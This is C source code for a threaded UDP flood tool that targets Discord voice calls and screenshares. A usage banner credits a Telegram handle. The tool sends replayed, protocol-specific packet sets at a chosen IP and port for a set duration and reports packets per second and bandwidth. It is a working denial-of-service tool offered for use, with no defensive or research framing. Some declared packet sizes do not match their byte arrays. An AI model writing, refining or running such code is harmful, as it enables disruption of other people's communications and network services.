#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

#define PAYLOAD_SIZE 1400

#define BLUE   "\033[34m"
#define WHITE  "\033[37m"
#define YELLOW "\033[33m"
#define RESET  "\033[0m"
#define FG_BBLACK   "\033[90m"
#define FG_BRED     "\033[91m"
#define FG_BGREEN   "\033[92m"
#define FG_BYELLOW  "\033[93m"
#define FG_BBLUE    "\033[94m"
#define FG_BMAGENTA "\033[95m"
#define FG_BCYAN    "\033[96m"
#define FG_BWHITE   "\033[97m"
volatile int running = 1;
volatile long packet_count = 0;

typedef struct {
    char ip[64];
    int port;
    int duration;
    char type[16];
} flood_args_t;

typedef struct {
    unsigned char* data;
    int size;
} packet_t;


packet_t packets[] = {
    {(unsigned char*)"\x13\x37\xca\xfe\x05\x00\x00\x00", 8},
    {(unsigned char*)"\x00\x01\x00\x46\x00\x00\xc6\x78\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2d\x64", 74},
    {(unsigned char*)"\x00\x01\x00\x46\x00\x00\xc6\x78\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbd\x78", 74},
    {(unsigned char*)"\x90\x78\x11\x54\xab\x19\x06\x13\x00\x00\xc6\xa7\xbe\xde\x00\x02\xd9\x21\x8e\x6d\xa8\xdc\x16\xd2\x82\x70\xc8\x55\xcc\x32\x0b\x9c\x99\xfc\xbc\xb2\x9d\x23\x51\x91\x54\x5b\x42\xbb\xe9\x05\x89\x7d\x67\x86\x3e\x54\xa2\xfc\x8b\x9e\x8c\xfd\xf8\xdb\x87\x83\x2d\x34\xb1\xd9\x75\xba\xdc\xb7\xbf\xc2\xc3\x68\xc6\xb7\x30\xc4\x8c\x35\x0e\x41\x75\x7e\x54\x68\x61\xc6\x3e\x56\x8e\xf3\x73\x8c\x81\x1a\x49\xed\x47\x2c\xa3\xc2\xf4\x56\x4f\x4a\x89\x30\x1e\x16\x96\xba\x07\x66\x0c\x2a\x18\xc1\x3a\x81\x3b\x19\x00\x00\x80", 125},
    {(unsigned char*)"\x90\x78\x09\x0c\x4a\xba\xf9\xcf\x00\x00\x38\x4d\xbe\xde\x00\x02\x7f\xc5\x9a\x93\x3b\xbd\xcd\x97\x76\x58\x93\x15\x54\xc5\x5c\xa7\xcf\x2d\x54\x87\xeb\xf9\x69\xd6\x6b\x20\xdc\x62\x5c\xc0\x40\x39\x9a\xbf\xfe\x92\xa7\xd8\x44\x92\x7e\x01\xc7\x67\x06\x0b\x18\xc3\x34\x4b\x90\x69\xfc\x04\xb7\x5f\xf2\x0a\xe8\xb9\x78\x42\xa0\xbe\x29\x82\xec\x54\x82\x92\xfe\x73\xb7\x4d\x6a\xc5\x80\x3b\xa7\xa2\x71\x6f\x9d\x9c\x2d\x87\x34\xe0\xc4\x98\xde\xc3\x8e\xff\xdd\x2e\x8d\x76\x8d\xce\x91\x02\x26\xde\x1d\xaf\x01\x94\x31\x87\xc9\x68\x1c\x57\xa7\x53\x80\x07\xbc\x43\x30\x63\x49\xea\x47\x2c\xe2\xd0\x76\x89\x8e\xc7\xdf\xe5\xab\x61\xb1\xc2\x93\x38\xfe\x9d\x8d\x8f\x8b\x9c\xb1\x52\x35\x74\x2c\x91\x10\x87\xa4\x19\x22\xc1\x00\x18\xaf\xec\x60\x6a\xc8\x48\xdb\x19\xc6\xf4\x0c\xdf\x1b\xdb\x0e\x58\x33\x89\x02\x48\x68\x14\x00\x80", 200},
    {(unsigned char*)"\x39\x30\x37\x38\x32\x35\x37\x61\x63\x61\x39\x65\x66\x32\x64\x62\x30\x30\x30\x30\x34\x34\x34\x62\x62\x65\x64\x65\x30\x30\x30\x32\x66\x35\x34\x64\x37\x64\x30\x36\x35\x65\x35\x39\x34\x34\x34\x64\x65\x64\x38\x31\x65\x33\x35\x37\x38\x32\x35\x33\x38\x64\x34\x36\x63\x34\x63\x37\x36\x65\x64\x37\x36\x31\x33\x39\x65\x36\x31\x30\x61\x63\x64\x62\x37\x32\x30\x39\x32\x64\x36\x62\x39\x39\x34\x36\x32\x31\x65\x34\x38\x38\x65\x63\x61\x64\x37\x38\x38\x37\x33\x30\x34\x33\x30\x30\x63\x38\x32\x32\x35\x61\x34\x31\x65\x35\x64\x61\x39\x30\x34\x34\x30\x61\x32\x39\x38\x30\x63\x61\x61\x37\x64\x30\x34\x33\x30\x39\x34\x39\x33\x37\x61\x63\x32\x37\x66\x62\x39\x61\x65\x33\x32\x62\x38\x38\x30\x63\x64\x36\x31\x38\x66\x66\x32\x65\x63\x32\x65\x31\x35\x39\x62\x35\x31\x61\x31\x66\x34\x35\x33\x61\x35\x39\x62\x65\x66\x63\x62\x61\x37\x30\x39\x66\x39\x38\x61\x63\x61\x65\x36\x63\x34\x32\x61\x31\x34\x33\x35\x63\x39\x38\x39\x31\x31\x64\x66\x36\x33\x31\x39\x65\x31\x39\x31\x39\x63\x32\x66\x39\x63\x64\x62\x61\x35\x39\x61\x31\x38\x65\x33\x36\x30\x61\x64\x63\x62\x63\x64\x39\x37\x36\x34\x66\x34\x30\x37\x33\x66\x63\x37\x61\x62\x64\x37\x63\x36\x64\x38\x61\x32\x34\x36\x63\x36\x62\x64\x64\x66\x65\x35\x37\x31\x65\x65\x39\x64\x65\x63\x63\x65\x31\x39\x66\x31\x66\x30\x31\x36\x30\x63\x66\x32\x63\x63\x39\x62\x65\x65\x31\x61\x62\x37\x38\x32\x65\x65\x39\x32\x33\x39\x37\x31\x37\x36\x61\x35\x31\x33\x34\x33\x61\x37\x33\x37\x62\x37\x36\x64\x32\x62\x63\x65\x66\x62\x35\x38\x31\x32\x31\x66\x65\x32\x36\x32\x64\x32\x66\x30\x62\x63\x34\x38\x33\x66\x32\x30\x39\x66\x31\x65\x33\x39\x30\x30\x30\x35\x66\x33\x32\x65\x39\x38\x32\x31\x65\x35\x65\x31\x30\x37\x64\x64\x62\x63\x62\x38\x61\x30\x64\x64\x65\x64\x34\x65\x37\x36\x38\x37\x32\x33\x64\x39\x30\x66\x34\x61\x34\x63\x33\x36\x36\x37\x35\x30\x33\x39\x30\x37\x64\x35\x63\x30\x34\x38\x30", 223},
    
    {(unsigned char*)"\x39\x30\x37\x38\x32\x35\x37\x64\x63\x61\x39\x65\x66\x65\x31\x62\x30\x30\x30\x30\x34\x34\x34\x62\x62\x65\x64\x65\x30\x30\x30\x32\x30\x62\x35\x38\x65\x61\x63\x61\x30\x64\x66\x30\x64\x36\x62\x39\x64\x66\x32\x66\x63\x36\x66\x66\x33\x39\x30\x38\x65\x64\x34\x33\x66\x65\x36\x38\x62\x34\x61\x65\x62\x35\x32\x63\x35\x63\x31\x64\x34\x32\x33\x65\x66\x65\x62\x38\x63\x65\x62\x39\x34\x31\x39\x63\x65\x35\x35\x65\x31\x32\x35\x38\x37\x65\x63\x34\x30\x35\x65\x37\x37\x39\x32\x39\x66\x36\x66\x61\x62\x65\x36\x65\x64\x35\x65\x39\x34\x38\x35\x65\x33\x37\x66\x30\x31\x64\x61\x64\x36\x62\x62\x61\x35\x31\x36\x36\x64\x66\x34\x62\x37\x30\x65\x35\x64\x39\x65\x61\x34\x30\x34\x63\x34\x34\x39\x37\x34\x66\x64\x33\x37\x63\x64\x36\x63\x39\x65\x32\x38\x34\x64\x32\x66\x66\x39\x35\x36\x39\x34\x38\x32\x30\x35\x31\x37\x33\x33\x38\x34\x61\x63\x30\x63\x33\x37\x37\x34\x35\x38\x30\x38\x34\x32\x39\x65\x65\x36\x32\x38\x30\x33\x39\x37\x32\x33\x34\x38\x35\x63\x33\x37\x33\x65\x32\x31\x65\x37\x32\x64\x31\x63\x31\x33\x34\x36\x35\x39\x65\x66\x30\x38\x30\x36\x39\x36\x30\x61\x35\x31\x37\x37\x34\x33\x34\x65\x31\x39\x33\x36\x36\x62\x35\x36\x65\x66\x39\x35\x61\x63\x30\x39\x39\x66\x30\x63\x64\x31\x36\x30\x30\x62\x33\x37\x37\x64\x65\x63\x61\x39\x61\x33\x65\x34\x65\x31\x65\x34\x63\x65\x33\x31\x37\x39\x35\x63\x64\x65\x64\x66\x35\x64\x33\x36\x61\x30\x63\x32\x32\x33\x34\x62\x39\x38\x63\x65\x36\x62\x61\x32\x63\x35\x34\x65\x31\x64\x63\x39\x65\x37\x61\x35\x61\x34\x31\x64\x33\x63\x65\x39\x38\x38\x66\x36\x62\x62\x65\x61\x39\x34\x30\x31\x63\x61\x66\x62\x63\x30\x30\x66\x35\x38\x66\x35\x32\x30\x36\x35\x36\x63\x32\x62\x65\x31\x33\x37\x35\x39\x64\x32\x65\x30\x33\x62\x35\x61\x63\x65\x61\x36\x35\x30\x62\x36\x62\x38\x30\x35\x63\x30\x34\x38\x30\x0a", 213},
    
    {(unsigned char*)"\x39\x30\x37\x38\x32\x35\x38\x36\x63\x61\x39\x66\x31\x66\x64\x62\x30\x30\x30\x30\x34\x34\x34\x62\x62\x65\x64\x65\x30\x30\x30\x32\x61\x61\x36\x35\x33\x34\x35\x35\x39\x35\x39\x61\x63\x65\x32\x65\x34\x39\x39\x39\x36\x61\x39\x39\x34\x33\x34\x66\x30\x39\x33\x30\x62\x35\x62\x35\x61\x39\x38\x32\x38\x64\x63\x30\x36\x39\x64\x64\x65\x36\x63\x61\x64\x33\x38\x35\x61\x34\x38\x39\x62\x34\x34\x35\x33\x32\x31\x36\x32\x65\x30\x34\x33\x66\x30\x31\x34\x63\x66\x32\x37\x62\x61\x64\x62\x31\x61\x62\x64\x38\x36\x38\x35\x62\x37\x31\x35\x62\x65\x38\x66\x62\x65\x63\x30\x66\x66\x63\x31\x31\x63\x38\x34\x37\x38\x37\x65\x33\x61\x35\x39\x30\x34\x33\x39\x37\x35\x35\x33\x64\x32\x35\x66\x65\x66\x62\x34\x65\x64\x62\x66\x33\x62\x31\x64\x37\x64\x61\x38\x64\x61\x33\x30\x30\x62\x33\x34\x30\x37\x36\x35\x63\x37\x61\x64\x32\x61\x62\x35\x31\x64\x34\x37\x66\x36\x33\x35\x63\x35\x33\x63\x61\x65\x65\x31\x64\x31\x36\x31\x38\x37\x38\x63\x37\x64\x39\x36\x35\x39\x33\x35\x65\x61\x65\x33\x64\x35\x36\x37\x30\x64\x62\x64\x62\x64\x36\x37\x64\x30\x65\x66\x30\x31\x37\x38\x33\x38\x31\x36\x31\x63\x65\x32\x33\x62\x34\x34\x63\x61\x38\x64\x33\x66\x32\x31\x30\x33\x62\x63\x31\x39\x36\x63\x35\x64\x64\x66\x63\x61\x34\x36\x61\x37\x63\x35\x35\x62\x33\x34\x30\x62\x30\x36\x34\x31\x30\x31\x65\x36\x62\x64\x36\x30\x66\x36\x37\x65\x63\x38\x37\x32\x36\x63\x63\x62\x35\x62\x66\x38\x34\x32\x32\x34\x66\x35\x62\x64\x37\x33\x61\x32\x30\x65\x38\x63\x31\x31\x63\x30\x34\x64\x37\x64\x65\x30\x39\x35\x33\x64\x39\x31\x38\x33\x61\x39\x32\x35\x37\x30\x37\x38\x35\x37\x30\x39\x65\x37\x32\x38\x64\x35\x31\x34\x33\x34\x34\x31\x32\x63\x39\x61\x62\x39\x32\x66\x34\x37\x64\x32\x65\x65\x35\x36\x62\x31\x62\x31\x65\x66\x34\x62\x30\x31\x39\x64\x33\x30\x61\x61\x31\x61\x30\x63\x63\x38\x39\x35\x63\x30\x34\x38\x30", 218}
};


// 19.36 - kwn
packet_t screen_packets[] = {
    {(unsigned char*)"\x00\x01\x00\x46\x00\x06\x46\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xca\x4c", 200},
    {(unsigned char*)"\x00\x01\x00\x46\x00\x06\x46\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4e\x64", 200},
    {(unsigned char*)"\x00\x02\x00\x46\x00\x06\x46\xa6\x31\x34\x39\x2e\x33\x34\x2e\x32\x31\x36\x2e\x39\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\xe9", 200},
    {(unsigned char*)"\x00\x02\x00\x46\x00\x06\x46\xa6\x31\x34\x39\x2e\x33\x34\x2e\x32\x31\x36\x2e\x39\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\xa4", 200},
    {(unsigned char*)"\x13\x37\xca\xfe\x01\x00\x00\x00", 24},
    {(unsigned char*)"\x90\x78\xca\xfa\xae\x6e\x1e\x87\x00\x06\x46\xa6\xf1\xfe\x5d\x12\xbd\xb2\x49\x5b\x54\x13\xec\xe9\x35\xb9\x6f\xa0\x5e\x78\xaf\x46\x51\x83\xcb\x60\x7e\x92\xf5\x86\x91\x20\x5b", 116},
    {(unsigned char*)"\x90\x78\xcb\x3d\xae\x6e\xe5\x47\x00\x06\x46\xa6\xbe\xde\x00\x02\x59\xe4\x84\xb7\xab\xfb\x57\x22\xce\x2b\x55\xbc\x7a\x6e\x95\xc1\x56\x83\x7e\x3c\x9e\xb7\x5b\x51\xdd\x82\x7f\x2e\xec\x41\xf1\x2e\x2f\x94\x3c\x4f\x18\xb5\xef\xee\x6c\x39\x2f\x3e\x55\x38\x04\xb9\xdd\xa1\xae\x37\x58\x3d\x5d\x61\x08\xce\x53\x87\x38\x99\xe6\x2e\xba\xfb\xd1\x2b\x36\x70\xaa\x5f\x28\x53\x5c\x6a\xaf\xb4\x06\xd6\x83\x35\x4f\x3a\x6e\xd6\x46\x7f\x8d\x84\x70\xa3\x48\x1b\xa0\x53\xfc\x94\x1d\xae\xa0\xa0\x77\x4d\x49\x5c\xd2\xf7\x39\xa0\x9c\xd6\xf0\x37\x64\xca\x78\x72\xdf\xf2\x64\x3a\x00\x00\x80", 376},
};

int num_packets = sizeof(packets) / sizeof(packets[0]);
int num_screen_packets = sizeof(screen_packets) / sizeof(screen_packets[0]);

void* flood_thread(void* arg) {
    flood_args_t* args = (flood_args_t*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(NULL);

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &target.sin_addr);

    // Paket setini seÃ§
    packet_t* selected_packets;
    int num_selected_packets;
    
    if (strcmp(args->type, "screen") == 0) {
        selected_packets = screen_packets;
        num_selected_packets = num_screen_packets;
    } else {

        selected_packets = packets;
        num_selected_packets = num_packets;
    }

    int packet_index = 0;
    
    while (running) {
        packet_t* current_packet = &selected_packets[packet_index];
        

        for (int i = 0; i < 4; i++) {
            sendto(sock, current_packet->data, current_packet->size, 0, 
                   (struct sockaddr*)&target,sizeof(target));
        }
        
        __sync_fetch_and_add(&packet_count, 1);
        packet_index = (packet_index + 1) % num_selected_packets;
    }

    close(sock);
    pthread_exit(NULL);
}

void* monitor_thread(void* arg) {
    (void)arg;
    while (running) {
        sleep(1);
        long count = __sync_fetch_and_and(&packet_count, 0);
        double mbps = (count * PAYLOAD_SIZE * 8) / 1e6;
        printf(FG_BWHITE "[" FG_BYELLOW "C/DISCORD" FG_BWHITE "] " FG_BBLUE "PPS: " WHITE "%ld" RESET " - Bandwidth: " WHITE "%.2f " YELLOW "Mbps" RESET "\n", count, mbps);

    }
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        printf(FG_BCYAN "Telegram" FG_BWHITE " : @Rootkawun" FG_BYELLOW " - " FG_BWHITE "C/DISCORD" FG_BYELLOW " - " FG_BWHITE "Date: 25/10/2025\n");
       // printf("Usage: %s <IP> <PORT> <DURATION> <THREADS> <TYPE>\n", argv[0]);
       printf(FG_BYELLOW "Usage " FG_BWHITE ": " RESET "%s" 
       FG_BBLUE " <" FG_BWHITE "IP" FG_BBLUE ">" 
       FG_BBLUE " <" FG_BWHITE "PORT" FG_BBLUE ">" 
       FG_BBLUE " <" FG_BWHITE "DURATION" FG_BBLUE ">" 
       FG_BBLUE " <" FG_BWHITE "THREADS" FG_BBLUE ">" 
       FG_BBLUE " <" FG_BWHITE "TYPE" FG_BBLUE ">" RESET "\n", 
       argv[0]);
        printf(FG_BCYAN "Type 'screen' " FG_BWHITE ":" FG_BYELLOW " For discord screenshares\n" RESET);
    printf(FG_BCYAN "Type 'voice'  " FG_BWHITE ":" FG_BYELLOW " For discord voice calls\n" RESET);
        return 1;
    }

    srand(time(NULL));
    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    char* type = argv[5];

    if (strcmp(type, "voice") != 0 && strcmp(type, "screen") != 0) {
        printf("Error: TYPE must be either 'voice' or 'screen'\n");
        return 1;
    }


    pthread_t tid[threads], monitor;
    flood_args_t args;
    strncpy(args.ip, ip, sizeof(args.ip) - 1);
    args.port = port;
    args.duration = duration;
    strncpy(args.type, type, sizeof(args.type) - 1);

    pthread_create(&monitor, NULL, monitor_thread, NULL);
    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, flood_thread, &args);
        usleep(100);
    }

    sleep(duration);
    running = 0;

    for (int i = 0; i < threads; i++) pthread_join(tid[i], NULL);
    pthread_join(monitor, NULL);

    printf("\n");
    return 0;
}